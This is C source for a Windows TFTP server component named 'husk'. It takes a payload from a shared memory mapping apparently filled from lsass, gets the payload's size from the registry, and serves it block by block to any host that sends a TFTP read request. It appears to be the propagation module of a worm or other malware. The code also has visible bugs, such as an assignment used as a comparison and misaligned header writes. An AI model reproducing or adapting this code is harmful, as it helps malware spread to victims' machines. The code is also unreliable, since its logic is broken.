#include "main.h"
#include "globals.h"



HANDLE				payload_transfer_handle;
HANDLE				payload_transfer_mapping_handle;
DWORD				*payload_transfer_mapping;
DWORD				payload_transfer_size				 = 0;
SOCKET				local_tftp;

BOOL tftpd_intro(VOID)
{	
	struct sockaddr_in	local_address, remote_address;
	WSADATA				wsadata = {0};
	ERROR_CODE			status;
	char				tx_buffer[1024], rx_buffer[1024];
	int					bytes;
	BYTE				*ptr;
	DWORD				*payload, *payload_ptr;
	unsigned int		payload_size, total_sent = 0, block_counter = 1;
	unsigned int		send_size = 512;

	fd_set				read_flags, write_flags;
	struct timeval		waitd;

	// Create the critical section object
	EnterCriticalSection(&husk_tftp_sync);

	// Obtain the mutex for the payload transfer
	payload_transfer_handle = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, LSASS_TO_HUSK_PAYLOAD_MUTEX);
	if (payload_transfer_handle == NULL) {
		LeaveCriticalSection(&husk_tftp_sync);
		ExitThread(0);
	}

	WaitForSingleObject(payload_transfer_handle, INFINITE);

	// Now obtain the handle to the remote mapping object
	payload_transfer_mapping_handle = OpenFileMappingA(	FILE_MAP_ALL_ACCESS,
														FALSE,
														LSASS_TO_HUSK_PAYLOAD_MAPPING);
	if (payload_transfer_mapping_handle == NULL) {
		LeaveCriticalSection(&husk_tftp_sync);
	}
	
	// Get the size of the remote mapping // FIXME - virtualquery
	payload_transfer_size = read_registry_key(PAYLOAD_SIZE_HIVE, PAYLOAD_SIZE_SUBKEY, PAYLOAD_SIZE_NAME);
	if (payload_transfer_size == NULL) {
		LeaveCriticalSection(&husk_tftp_sync);
		ExitThread(0);
	}

	// Get a pointer to the remote mapping
	payload_transfer_mapping = (PDWORD)MapViewOfFile(	payload_transfer_mapping_handle,
														FILE_MAP_ALL_ACCESS,
														0,
														0,
														payload_transfer_size);
	if (payload_transfer_mapping == NULL) {
		LeaveCriticalSection(&husk_tftp_sync);
		ExitThread(0);
	}

	// Initialize networking
	WSAStartup(MAKEWORD(1,1), &wsadata);

	local_tftp = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (local_tftp == INVALID_SOCKET) {
		//BREAK;
		tftp_exit(FALSE);
	}

	ZeroMemory((void *)&local_address, sizeof(struct sockaddr_in));
	local_address.sin_family = AF_INET;
	local_address.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	local_address.sin_port = htons(DEFAULT_TFTPD_PORT);

	if (bind(local_tftp, &local_address, sizeof(struct sockaddr_in)) == -1) {
		//BREAK;
		tftp_exit(FALSE);
	}

	// Wait 30 seconds for request
	waitd.tv_sec = 30;
	waitd.tv_usec = 0;
	FD_ZERO(&read_flags);
	FD_ZERO(&write_flags);
	FD_SET(0, &write_flags);
	FD_SET(local_tftp, &read_flags);

	LeaveCriticalSection(&husk_tftp_sync);

	// Wait for initial request
	status = select(local_tftp, &read_flags, NULL, NULL, &waitd);
	if (status == 0) {
		//BREAK;
		tftp_exit(FALSE);
	}

	// We have a possible request
	ZeroMemory(rx_buffer, sizeof(rx_buffer));
	ZeroMemory((void *)&remote_address, sizeof(struct sockaddr_in));
	bytes = sizeof(struct sockaddr_in);
	if (recvfrom(local_tftp, rx_buffer, sizeof(rx_buffer), 0, &remote_address, &bytes) == -1) {
		//BREAK;
		tftp_exit(FALSE);
	}

	/*
0x014DD984  00 01 63 61  ..ca
0x014DD988  6c 63 2e 65  lc.e
0x014DD98C  78 65 00 6f  xe.o
0x014DD990  63 74 65 74  ctet
	*/

	ptr = (PBYTE)rx_buffer;
	if (*(WORD *)ptr != (WORD)0x0100) {
		//BREAK;
		tftp_exit(FALSE);
	}

	// It is a tftp request
	EnterCriticalSection(&husk_tftp_sync);

	// Our request string should be 10 characters long (without null)
	ptr += 2;
	status = string_length((char *)ptr);
	if (status != 10) {
		//BREAK;
		tftp_exit(FALSE);
	}

	// Should be octet
	ptr += 11;
	if (string_compare((unsigned char *)ptr, (unsigned char *)"octet", string_length("octet"))) {
		//BREAK;
		tftp_exit(FALSE);
	}

#ifdef DEBUG_OUT
	send_debug_channel("+tftpd(husk)> tftpd is beginning transmission...");
#endif

	// Find our payload
	//payload = get_pointer_to_payload(&payload_size);

	// OK, let's start sending data
	payload_ptr		= payload = payload_transfer_mapping;
	payload_size	= payload_transfer_size;
	while (TRUE) {
		// Are we done?
		 
		// Assemble tx_buffer
		ZeroMemory(tx_buffer, sizeof(tx_buffer));

		// Opcode 0x0003
		*(WORD *)((DWORD)tx_buffer + 1) = 0x0003;
		*(WORD *)((DWORD)tx_buffer + 3) = block_counter;

		// Copy data to transmit
		CopyMemory((void *)((DWORD)tx_buffer + 4), payload_ptr, send_size);
		payload_ptr = (PDWORD)((DWORD)payload_ptr + 512);
		total_sent += 512;

		// Transmit
		if (sendto(local_tftp, tx_buffer, (send_size + 4), 0, &remote_address, sizeof(struct sockaddr_in)) == -1) {

			//LeaveCriticalSection(&lock_gateway_payload);
			//BREAK;
			tftp_exit(FALSE);
		}

		// Wait for acknowledgement
		// Wait 10 seconds for request
		waitd.tv_sec = 10;
		waitd.tv_usec = 0;
		FD_ZERO(&read_flags);
		FD_ZERO(&write_flags);
		FD_SET(0, &write_flags);
		FD_SET(local_tftp, &read_flags);

		// Wait for initial request
		status = select(local_tftp, &read_flags, NULL, NULL, &waitd);
		if (status == 0) {

			// Timeout occurred

			//LeaveCriticalSection(&lock_gateway_payload);

			tftp_exit(TRUE);
		}

		// We have a possible request
		ZeroMemory(rx_buffer, sizeof(rx_buffer));
		ZeroMemory((void *)&remote_address, sizeof(struct sockaddr_in));
		bytes = sizeof(struct sockaddr_in);
		if (recvfrom(local_tftp, rx_buffer, sizeof(rx_buffer), 0, &remote_address, &bytes) == -1) {

			//LeaveCriticalSection(&lock_gateway_payload);

			tftp_exit(TRUE);
		}

		// Check ack
		// 00 04 00 nn
		if (*(WORD *)rx_buffer != 0x0400) {

			//LeaveCriticalSection(&lock_gateway_payload);
			////BREAK;
			tftp_exit(FALSE);
		}
		if (*(WORD *)((DWORD)rx_buffer + 3) != (WORD)block_counter) {

			//LeaveCriticalSection(&lock_gateway_payload);
			//BREAK;
			tftp_exit(FALSE);
		}



		// Increment
		block_counter++;


		// Is this the last block?
		if ((total_sent + 512) > payload_size) {
			send_size = (payload_size - total_sent);
			if (send_size = 0) {
				// Send final trailer
				// Assemble tx_buffer
				ZeroMemory(tx_buffer, sizeof(tx_buffer));

				// Opcode 0x0003
				*(WORD *)((DWORD)tx_buffer + 1) = 0x0003;
				*(WORD *)((DWORD)tx_buffer + 3) = block_counter;

				// Transmit
				if (sendto(local_tftp, tx_buffer, 32, 0, &remote_address, sizeof(struct sockaddr_in)) == -1) {

					//BREAK;
					tftp_exit(FALSE);
				}
				break;
			}
		}
	}

	// Close shared memory region
	UnmapViewOfFile(payload_transfer_mapping);
	CloseHandle(payload_transfer_mapping_handle);

	// Nothing catches this return code anyway
	tftp_exit(TRUE);
}

VOID tftp_exit(ERROR_CODE status)
{

	// Cleanup handles and mappings
	ReleaseMutex(payload_transfer_handle);
	CloseHandle(payload_transfer_handle);
	CloseHandle(payload_transfer_mapping_handle);
	UnmapViewOfFile(payload_transfer_mapping);
	closesocket(local_tftp);
	WSACleanup();

	// Signal registry
	if (status == TRUE) {
		create_registry_key(TFTPD_RC_HIVE, TFTPD_RC_SUBKEY, TFTPD_RC_NAME, 1);
#ifdef DEBUG_OUT
		send_debug_channel("+tftpd(husk)> tftpd exiting with SUCCESS");
#endif
	} else if (status == FALSE) {
		create_registry_key(TFTPD_RC_HIVE, TFTPD_RC_SUBKEY, TFTPD_RC_NAME, 0);
#ifdef DEBUG_OUT
		send_debug_channel("+tftpd(husk)> tftpd exiting with FAILURE");
#endif
	}

	// Release the mutex
	LeaveCriticalSection(&husk_tftp_sync);

	ExitThread(0);
}
